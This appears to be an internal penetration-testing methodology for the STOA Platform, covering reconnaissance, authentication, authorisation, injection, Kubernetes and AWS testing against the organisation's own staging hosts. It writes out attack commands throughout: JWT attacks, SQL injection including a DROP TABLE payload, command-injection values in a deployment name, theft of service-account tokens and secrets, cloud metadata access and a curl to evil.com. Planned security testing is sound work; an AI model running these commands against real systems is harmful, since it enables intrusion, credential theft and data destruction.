# STOA Platform - Penetration Testing Methodology

> **Ticket**: CAB-236
> **Version**: 1.0
> **Date**: 2026-01-05

## Overview

This document describes the methodology for manual penetration testing of the STOA Platform before production release.

---

## Phase 1: Reconnaissance (Day 1)

### 1.1 Information Gathering

#### Passive Reconnaissance

```bash
# DNS enumeration
dig +short stoa.cab-i.com
dig +short -t ANY stoa.cab-i.com
host -t mx stoa.cab-i.com
host -t txt stoa.cab-i.com

# Subdomain enumeration
subfinder -d stoa.cab-i.com -o subdomains.txt
amass enum -passive -d stoa.cab-i.com

# Certificate transparency
curl -s "https://crt.sh/?q=%.stoa.cab-i.com&output=json" | jq -r '.[].name_value' | sort -u

# Wayback machine
waybackurls stoa.cab-i.com
```

#### Active Reconnaissance

```bash
# Port scanning
nmap -sS -sV -p- --open -T4 api.staging.stoa.cab-i.com -oA nmap-full

# Service detection
nmap -sV -sC -p 80,443,8443 api.staging.stoa.cab-i.com

# Web technologies
whatweb https://api.staging.stoa.cab-i.com
wappalyzer https://console.staging.stoa.cab-i.com
```

### 1.2 API Discovery

```bash
# Fetch OpenAPI specs
curl https://api.staging.stoa.cab-i.com/openapi.json -o api-spec.json
curl https://mcp.staging.stoa.cab-i.com/openapi.json -o mcp-spec.json

# Extract endpoints
cat api-spec.json | jq -r '.paths | keys[]' > api-endpoints.txt

# Test for common endpoints
ffuf -u https://api.staging.stoa.cab-i.com/FUZZ -w wordlists/api-endpoints.txt -mc 200,201,301,302,401,403
```

### 1.3 Technology Stack Identification

| Component | Expected Technology | Verification |
|-----------|---------------------|--------------|
| API | FastAPI (Python) | `/openapi.json`, `server` header |
| Frontend | React | Bundle analysis, `X-Powered-By` |
| Auth | Keycloak 25.x | `/realms/stoa/.well-known/openid-configuration` |
| Gateway | webMethods API Gateway | Headers, error messages |
| MCP | FastAPI + OPA | `/mcp/v1/health` |

---

## Phase 2: Authentication Testing (Day 1-2)

### 2.1 Keycloak Authentication Bypass

#### Token Analysis

```bash
# Get a valid token
TOKEN=$(curl -s -X POST "https://auth.staging.stoa.cab-i.com/realms/stoa/protocol/openid-connect/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=password" \
  -d "client_id=stoa-ui" \
  -d "username=test-user" \
  -d "password=test-password" | jq -r '.access_token')

# Decode and analyze JWT
echo $TOKEN | cut -d'.' -f2 | base64 -d | jq .

# Check signature algorithm
echo $TOKEN | cut -d'.' -f1 | base64 -d | jq .
```

#### JWT Attack Vectors

```bash
# 1. Algorithm confusion (none)
python3 scripts/jwt-none-attack.py $TOKEN

# 2. Algorithm confusion (HS256 with public key)
python3 scripts/jwt-algorithm-confusion.py $TOKEN

# 3. Key ID injection
python3 scripts/jwt-kid-injection.py $TOKEN

# 4. Weak secret brute force
hashcat -m 16500 jwt.txt wordlists/jwt-secrets.txt
```

### 2.2 Session Management

```bash
# Test token reuse after logout
curl -H "Authorization: Bearer $EXPIRED_TOKEN" https://api.staging.stoa.cab-i.com/v1/me

# Test concurrent sessions
# Login from multiple locations

# Test session timeout
# Wait for token expiry, test refresh token
```

### 2.3 Password Policy

```bash
# Test password complexity
curl -X POST "https://auth.staging.stoa.cab-i.com/realms/stoa/protocol/openid-connect/token" \
  -d "grant_type=password&client_id=stoa-ui&username=test&password=123"

# Test account lockout
for i in {1..10}; do
  curl -X POST "https://auth.staging.stoa.cab-i.com/realms/stoa/protocol/openid-connect/token" \
    -d "grant_type=password&client_id=stoa-ui&username=admin&password=wrong$i"
done

# Test password reset flow
# Check for token predictability
```

---

## Phase 3: Authorization Testing (Day 2)

### 3.1 Privilege Escalation (Viewer -> Admin)

```bash
# Get viewer token
VIEWER_TOKEN=$(get_token viewer)

# Try admin endpoints
curl -H "Authorization: Bearer $VIEWER_TOKEN" \
  https://api.staging.stoa.cab-i.com/v1/tenants

curl -H "Authorization: Bearer $VIEWER_TOKEN" \
  -X POST https://api.staging.stoa.cab-i.com/v1/apis \
  -d '{"name":"test"}'
```

### 3.2 BOLA/IDOR Testing

```bash
# Get tenant A's resources
TENANT_A_API=$(curl -H "Authorization: Bearer $TENANT_A_TOKEN" \
  https://api.staging.stoa.cab-i.com/v1/apis | jq -r '.[0].id')

# Try to access with tenant B's token
curl -H "Authorization: Bearer $TENANT_B_TOKEN" \
  https://api.staging.stoa.cab-i.com/v1/apis/$TENANT_A_API

# Try IDOR on various resources
# - /v1/apis/{id}
# - /v1/applications/{id}
# - /v1/tenants/{id}
# - /v1/deployments/{id}
```

### 3.3 Function Level Access Control

```bash
# Test each role against each endpoint
./scripts/test-rbac-matrix.sh

# Expected matrix:
# +----------------+--------+-------+--------+--------+
# | Endpoint       | Admin  | CPI   | DevOps | Viewer |
# +----------------+--------+-------+--------+--------+
# | GET /apis      | ✓      | ✓     | ✓      | ✓      |
# | POST /apis     | ✓      | ✓     | ✓      | ✗      |
# | DELETE /apis   | ✓      | ✓     | ✗      | ✗      |
# | GET /tenants   | ✓      | ✗     | ✗      | ✗      |
# +----------------+--------+-------+--------+--------+
```

---

## Phase 4: Injection Testing (Day 2-3)

### 4.1 SQL/NoSQL Injection

```bash
# PostgreSQL injection tests
curl -H "Authorization: Bearer $TOKEN" \
  "https://api.staging.stoa.cab-i.com/v1/apis?name=test' OR '1'='1"

curl -H "Authorization: Bearer $TOKEN" \
  "https://api.staging.stoa.cab-i.com/v1/apis?name=test'; DROP TABLE apis;--"

# Time-based blind SQL injection
curl -H "Authorization: Bearer $TOKEN" \
  "https://api.staging.stoa.cab-i.com/v1/apis?name=test' AND SLEEP(5)--"

# MongoDB injection (if applicable)
curl -H "Authorization: Bearer $TOKEN" \
  -X POST https://api.staging.stoa.cab-i.com/v1/search \
  -d '{"query": {"$ne": null}}'
```

### 4.2 Command Injection

```bash
# Test deployment parameters
curl -H "Authorization: Bearer $TOKEN" \
  -X POST https://api.staging.stoa.cab-i.com/v1/deployments \
  -d '{"name": "test; whoami"}'

curl -H "Authorization: Bearer $TOKEN" \
  -X POST https://api.staging.stoa.cab-i.com/v1/deployments \
  -d '{"name": "test$(whoami)"}'

curl -H "Authorization: Bearer $TOKEN" \
  -X POST https://api.staging.stoa.cab-i.com/v1/deployments \
  -d '{"name": "test`whoami`"}'
```

### 4.3 SSTI (Server-Side Template Injection)

```bash
# Test template injection in API responses
curl -H "Authorization: Bearer $TOKEN" \
  -X POST https://api.staging.stoa.cab-i.com/v1/apis \
  -d '{"description": "{{7*7}}"}'

curl -H "Authorization: Bearer $TOKEN" \
  -X POST https://api.staging.stoa.cab-i.com/v1/apis \
  -d '{"description": "${7*7}"}'
```

---

## Phase 5: API Security Testing (Day 3)

### 5.1 Mass Assignment

```bash
# Try to set admin flag during registration
curl -X POST https://api.staging.stoa.cab-i.com/v1/users/register \
  -d '{"username":"test","password":"test123","is_admin":true}'

# Try to modify read-only fields
curl -H "Authorization: Bearer $TOKEN" \
  -X PATCH https://api.staging.stoa.cab-i.com/v1/apis/123 \
  -d '{"created_at":"2020-01-01","owner":"admin"}'
```

### 5.2 Rate Limiting Bypass

```bash
# Basic rate limit test
for i in {1..100}; do
  curl -s -o /dev/null -w "%{http_code}\n" \
    https://api.staging.stoa.cab-i.com/v1/health
done

# X-Forwarded-For bypass
for i in {1..100}; do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -H "X-Forwarded-For: 10.0.0.$i" \
    https://api.staging.stoa.cab-i.com/v1/health
done

# X-Real-IP bypass
for i in {1..100}; do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -H "X-Real-IP: 10.0.0.$i" \
    https://api.staging.stoa.cab-i.com/v1/health
done
```

### 5.3 GraphQL Testing (if applicable)

```bash
# Introspection
curl -X POST https://api.staging.stoa.cab-i.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name } } }"}'

# Batching attack
curl -X POST https://api.staging.stoa.cab-i.com/graphql \
  -H "Content-Type: application/json" \
  -d '[{"query":"..."}, {"query":"..."}, ...]'
```

---

## Phase 6: Container & K8s Security (Day 3-4)

### 6.1 Container Escape Testing

```bash
# Check for privileged containers
kubectl get pods -A -o json | jq '.items[] | select(.spec.containers[].securityContext.privileged==true)'

# Check for host path mounts
kubectl get pods -A -o json | jq '.items[] | select(.spec.volumes[].hostPath != null)'

# Check for host network
kubectl get pods -A -o json | jq '.items[] | select(.spec.hostNetwork==true)'
```

### 6.2 K8s RBAC Testing

```bash
# Test service account permissions
kubectl auth can-i --list --as=system:serviceaccount:stoa-system:control-plane-api

# Test cluster role bindings
kubectl get clusterrolebindings -o json | jq '.items[] | select(.subjects[].namespace=="stoa-system")'

# Test pod security policies/standards
kubectl get psp
kubectl get podsecuritypolicies
```

### 6.3 Secrets Exposure

```bash
# Check for exposed secrets
kubectl get secrets -A -o json | jq '.items[] | select(.type!="kubernetes.io/service-account-token") | {name: .metadata.name, namespace: .metadata.namespace}'

# Test secret access from pods
kubectl exec -it deploy/control-plane-api -n stoa-system -- env | grep -i secret
kubectl exec -it deploy/control-plane-api -n stoa-system -- cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Test Vault access
kubectl exec -it deploy/control-plane-api -n stoa-system -- vault kv list secret/
```

---

## Phase 7: Infrastructure Testing (Day 4)

### 7.1 AWS IAM Enumeration

```bash
# Enumerate IAM roles (if IRSA)
aws sts get-caller-identity

# Check for overly permissive roles
aws iam list-attached-role-policies --role-name stoa-eks-node-role

# Test S3 bucket access
aws s3 ls s3://stoa-backups-dev/
aws s3 cp s3://stoa-backups-dev/test.txt ./test.txt
```

### 7.2 Network Segmentation

```bash
# Test cross-namespace communication
kubectl run test --image=busybox -n default -- /bin/sh -c "wget -qO- http://control-plane-api.stoa-system.svc.cluster.local:8000/v1/health"

# Test egress filtering
kubectl exec -it deploy/control-plane-api -n stoa-system -- curl http://evil.com

# Test network policies
kubectl get networkpolicies -A
```

### 7.3 Lateral Movement

```bash
# From compromised pod, enumerate services
kubectl exec -it deploy/control-plane-api -n stoa-system -- nslookup kubernetes.default

# Test access to node metadata (AWS)
kubectl exec -it deploy/control-plane-api -n stoa-system -- curl http://169.254.169.254/latest/meta-data/
```

---

## Phase 8: Reporting (Day 5)

### 8.1 Vulnerability Classification

| Severity | CVSS Score | Response Time |
|----------|------------|---------------|
| Critical | 9.0-10.0 | Immediate (< 24h) |
| High | 7.0-8.9 | 1-3 days |
| Medium | 4.0-6.9 | 1 week |
| Low | 0.1-3.9 | Next release |

### 8.2 Report Contents

1. **Executive Summary** - High-level findings for management
2. **Scope & Methodology** - What was tested and how
3. **Findings** - Detailed vulnerabilities with:
   - Description
   - Risk rating (CVSS)
   - Proof of Concept
   - Screenshots/Evidence
   - Remediation
4. **Positive Findings** - What was done well
5. **Recommendations** - Priority actions

### 8.3 Deliverables

- [ ] Pentest Report (PDF)
- [ ] Executive Summary (1 page)
- [ ] PoC evidence files
- [ ] Remediation plan with priorities
- [ ] Re-test report (after fixes)

---

## Tools Reference

| Tool | Purpose | Installation |
|------|---------|--------------|
| Burp Suite Pro | Web/API testing | Commercial license |
| ffuf | Fuzzing | `go install github.com/ffuf/ffuf@latest` |
| sqlmap | SQL injection | `apt install sqlmap` |
| jwt_tool | JWT attacks | `pip install jwt_tool` |
| kubectl | K8s testing | `curl -LO kubectl` |
| trivy | Container scanning | `apt install trivy` |
| nuclei | Vulnerability scanning | `go install github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest` |

---

## Contacts

- **Security Team**: security@cab-i.com
- **DevOps Team**: devops@cab-i.com
- **Emergency**: +33 X XX XX XX XX
